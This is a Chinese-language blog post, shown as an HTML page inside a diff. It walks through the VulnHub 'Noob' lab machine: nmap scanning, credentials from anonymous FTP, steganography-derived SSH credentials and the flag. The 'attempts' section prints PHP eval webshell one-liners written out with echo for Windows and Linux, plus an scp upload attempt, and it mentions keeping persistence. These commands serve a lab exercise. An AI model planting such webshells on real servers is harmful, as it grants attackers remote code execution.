@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mosquito.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="又开了新的vlunhub靶场—–noob靶场（菜鸟）首先还是先讲述遇到的问题：ftp服务浏览器访问不了这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。 解决方式：使用文件夹打开的方式：  如图所示在文件夹搜索框输入：ftp:&#x2F;&#x2F;192.168.50.130  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vlunhub noob靶场总结">
+<meta property="og:url" content="http://mosquito.top/2022/11/01/14-23-40/index.html">
+<meta property="og:site_name" content="mosquito的博客">
+<meta property="og:description" content="又开了新的vlunhub靶场—–noob靶场（菜鸟）首先还是先讲述遇到的问题：ftp服务浏览器访问不了这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。 解决方式：使用文件夹打开的方式：  如图所示在文件夹搜索框输入：ftp:&#x2F;&#x2F;192.168.50.130  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101150614.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151446.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151836.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101152924.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101154430.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101155258.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221101184629.gif">
+<meta property="article:published_time" content="2022-11-01T06:23:40.000Z">
+<meta property="article:modified_time" content="2022-11-01T10:53:16.879Z">
+<meta property="article:author" content="mosquito">
+<meta property="article:tag" content="靶场渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png">
+
+
+<link rel="canonical" href="http://mosquito.top/2022/11/01/14-23-40/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://mosquito.top/2022/11/01/14-23-40/","path":"2022/11/01/14-23-40/","title":"vlunhub noob靶场总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vlunhub noob靶场总结 | mosquito的博客</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mosquito的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%88%E5%BC%80%E4%BA%86%E6%96%B0%E7%9A%84vlunhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%93noob%E9%9D%B6%E5%9C%BA%EF%BC%88%E8%8F%9C%E9%B8%9F%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">又开了新的vlunhub靶场—–noob靶场（菜鸟）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E8%BF%98%E6%98%AF%E5%85%88%E8%AE%B2%E8%BF%B0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="nav-number"></span> <span class="nav-text">首先还是先讲述遇到的问题：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp%E6%9C%8D%E5%8A%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86"><span class="nav-number">1.</span> <span class="nav-text">ftp服务浏览器访问不了</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">解决方式：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="nav-number"></span> <span class="nav-text">信息收集：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%94%BB%E5%87%BB%E6%9C%BAIP%EF%BC%9A"><span class="nav-number">0.1.</span> <span class="nav-text">查找攻击机IP：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E6%AE%B5%E6%89%AB%E6%8F%8F%EF%BC%9A-%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%9C%BAIP"><span class="nav-number">0.2.</span> <span class="nav-text">网段扫描：(发现靶机IP)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4%E4%BC%9A%E6%89%AB%E4%B8%8D%E5%88%B0%E6%94%B9%E5%8F%98%E4%BA%86%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="nav-number">0.3.</span> <span class="nav-text">使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E8%BF%87ftp%E6%9C%8D%E5%8A%A1%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E7%9A%84%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="nav-number"></span> <span class="nav-text">通过ftp服务获取网站的登录账号密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E7%A0%B4%E8%AF%91"><span class="nav-number"></span> <span class="nav-text">图片隐写破译</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%99%BB%E5%BD%95ssh"><span class="nav-number"></span> <span class="nav-text">登录ssh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97flag"><span class="nav-number"></span> <span class="nav-text">获得flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95"><span class="nav-number"></span> <span class="nav-text">尝试:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%80"><span class="nav-number">1.</span> <span class="nav-text">尝试一:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E4%BA%8C"><span class="nav-number">2.</span> <span class="nav-text">尝试二:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%89"><span class="nav-number">3.</span> <span class="nav-text">尝试三:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%9B%A0"><span class="nav-number">3.1.</span> <span class="nav-text">原因:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E6%AC%A1"><span class="nav-number">3.1.1.</span> <span class="nav-text">其次</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-number">1.</span> <span class="nav-text">ftp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh"><span class="nav-number">2.</span> <span class="nav-text">ssh</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="mosquito"
+      src="/images/android-chrome-256x256.png">
+  <p class="site-author-name" itemprop="name">mosquito</p>
+  <div class="site-description" itemprop="description">学海无涯苦作舟</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mosquito.top/2022/11/01/14-23-40/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/android-chrome-256x256.png">
+      <meta itemprop="name" content="mosquito">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mosquito的博客">
+      <meta itemprop="description" content="学海无涯苦作舟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vlunhub noob靶场总结 | mosquito的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vlunhub noob靶场总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-11-01 14:23:40 / 修改时间：18:53:16" itemprop="dateCreated datePublished" datetime="2022-11-01T14:23:40+08:00">2022-11-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="又开了新的vlunhub靶场—–noob靶场（菜鸟）"><a href="#又开了新的vlunhub靶场—–noob靶场（菜鸟）" class="headerlink" title="又开了新的vlunhub靶场—–noob靶场（菜鸟）"></a>又开了新的vlunhub靶场—–noob靶场（菜鸟）</h2><h1 id="首先还是先讲述遇到的问题："><a href="#首先还是先讲述遇到的问题：" class="headerlink" title="首先还是先讲述遇到的问题："></a>首先还是先讲述遇到的问题：</h1><h2 id="ftp服务浏览器访问不了"><a href="#ftp服务浏览器访问不了" class="headerlink" title="ftp服务浏览器访问不了"></a>ftp服务浏览器访问不了</h2><p>这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。</p>
+<h3 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h3><p>使用文件夹打开的方式：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png"></p>
+<p>如图所示在文件夹搜索框输入：<a href="ftp://192.168.50.130/">ftp://192.168.50.130</a>  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的，有的ftp服务是需要输入账号密码的。本次靶机限定了读取和下载功能不能修改和上传.  (也是,如果能修改和上传直接改成一句话木马不就行了)</p>
+<h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>在开始之前我们都要知道如何查找靶机的IP地址</p>
+<h3 id="查找攻击机IP："><a href="#查找攻击机IP：" class="headerlink" title="查找攻击机IP："></a>查找攻击机IP：</h3><p>Linux：ifconfig</p>
+<p>Windows：ipconfig</p>
+<h3 id="网段扫描：-发现靶机IP"><a href="#网段扫描：-发现靶机IP" class="headerlink" title="网段扫描：(发现靶机IP)"></a>网段扫描：(发现靶机IP)</h3><p>kili: netdiscover -r 192.168.50.1/24</p>
+<p>本次靶机相对于之前的earth靶机更容易，主要信息收集手段为nmap</p>
+<p>使用nmap命令:</p>
+<h3 id="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"><a href="#使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务" class="headerlink" title="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"></a>使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务</h3><p>命令： nmap -sV -Pn -sT -sC -A -p- 192.168.50.130</p>
+<p>（应该开单章来说明一下信息收集中的工具命令）</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101150614.png"></p>
+<p>如图所示,标下划线的为开启的服务，图中就能看出全端口扫描的作用</p>
+<h1 id="通过ftp服务获取网站的登录账号密码"><a href="#通过ftp服务获取网站的登录账号密码" class="headerlink" title="通过ftp服务获取网站的登录账号密码"></a>通过ftp服务获取网站的登录账号密码</h1><p>如开头中所粘贴的图片所示，在ftp服务里将其中的两个文件下载到本地</p>
+<p>在cre.txt 文件中得到一串base64加密过的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y2hhbXA6cGFzc3dvcmQ=</span><br></pre></td></tr></table></figure>
+
+<p>解密得:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">champ:password</span><br></pre></td></tr></table></figure>
+
+<p>使用账号密码登录:(当然在得到这个账号密码前肯定在这个登陆界面进行过其他的测试,如弱口令,注入等)</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151446.png"></p>
+<p>登陆成功,在箭头所指的功能点,我们获取到一个.rar压缩文件.</p>
+<h1 id="图片隐写破译"><a href="#图片隐写破译" class="headerlink" title="图片隐写破译"></a>图片隐写破译</h1><p>如图</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151836.png"></p>
+<p>在下载下的压缩文件里看到两张图片,根据攻略可知里面包含了图片隐写.(不看攻略你知道有这东西?实战里有谁会丧心病狂的将自己的账号密码隐写放在图片中.)</p>
+<p>参考链接:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p>
+<p>具体破译我就不尝试了,直接抄袭</p>
+<p>最后得到ssh服务的登录账号密码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wtf:this one is a simple one</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101152924.png"></p>
+<p>如图箭头所示:</p>
+<p>成功远程登陆上ssh服务</p>
+<p>可以使用lastlog命令查看这台靶机的可以登录的账号以及登陆历史</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101154430.png"></p>
+<p>有一些是我在测试时添加到账号.</p>
+<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101155258.png"></p>
+<p>从这张图可以看出我的历程,Linux命令不熟悉.</p>
+<h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h1><p>在看了这两个协议后,我想通过这两个协议上传webshell</p>
+<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一:"></a>尝试一:</h2><p>使用ssh协议进行文件.</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /home/wugezhang/test.php wtf@192.168.50.130:/home/wtf/Downloads</span><br></pre></td></tr></table></figure>
+
+<p>不成功:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh: connect to host 192.168.50.130 port 22: Connection refused</span><br><span class="line">scp: Connection closed </span><br><span class="line"></span><br><span class="line">ssh：连接到主机 192.168.50.130 端口 22：连接被拒绝</span><br><span class="line">SCP：连接已关闭</span><br></pre></td></tr></table></figure>
+
+<p>一系列操作后发现不现实,如果能在对方环境添加环境变量更改设置了那传不传shell也无所谓了.</p>
+<p>但做好权限维持才是持久的道理.</p>
+<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二:"></a>尝试二:</h2><p>使用匿名的ftp协议服务进行文件上传shell</p>
+<p>尝试将文件上传进ftp服务的文件夹但失败了,我们只有下载与读的权限,没有上传与修改权限.</p>
+<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三:"></a>尝试三:</h2><p>尝试直接使用命令写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_post[test]);?&gt;&quot; &gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>但失败了,在命令里直接就将$_post给执行了</p>
+<h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>1.Windows：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;? php @eval($_POST[&#x27;x&#x27;]); ?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<p>（1）^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功度能，如果需要把它们作为字符输出知的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需道要对这些特殊字符做转义处理：在每个特殊字符回前加上转义字符^答，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^|^|、echo ^^……之类的格式来处理。此处转义&lt;和&gt;</p>
+<p>（2） 此处^为什么不换成引号？因为windows写入时会把引号写进去</p>
+<p>2.Linux:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27; &gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<p>$为linux系统的变量符号，原样输出字符串，不进行转义或取变量用单引号（此处否则会把$_POST当成变量处理）,x用双引号是为了和单引号区分</p>
+<h4 id="其次"><a href="#其次" class="headerlink" title="其次"></a>其次</h4><p>我们要写入网站的目录文件里面才能远程链接到shell</p>
+<p>失败了,我找不到网站根目录在哪里.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221101184629.gif"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>本次靶机的难度很低,最重要的就是使用nmap和Linux命令,</p>
+<p>图片隐写技术在现实生活中很少能用的上,主要就是ctf比赛里面的应用,所以本次我并没有花时间篇幅去使用.</p>
+<p>这次的靶机在我看来强调的就是ftp服务和ssh远程登录服务</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ftp协议用于计算机与计算机之间的数据传输文件传输,不同于HTTP协议.ftp服务默认开启21端口,使用账号密码登录(设置后),也可以匿名登录(不安全).</p>
+<p>链接:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterYong/p/8630542.html">【FTP】详解 - peterYong - 博客园 (cnblogs.com)</a></p>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh协议是用来支持远程登录的协议,也可以在有限制的条件下进行文件传输与读取.</p>
+<p>链接:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52165864/article/details/126028681"> SSH服务详解_欢喜躲在眉梢里的博客-CSDN博客_ssh服务</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 靶场渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/19/10-49-13/" rel="prev" title="内网学习笔记">
+                  <i class="fa fa-chevron-left"></i> 内网学习笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mosquito</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
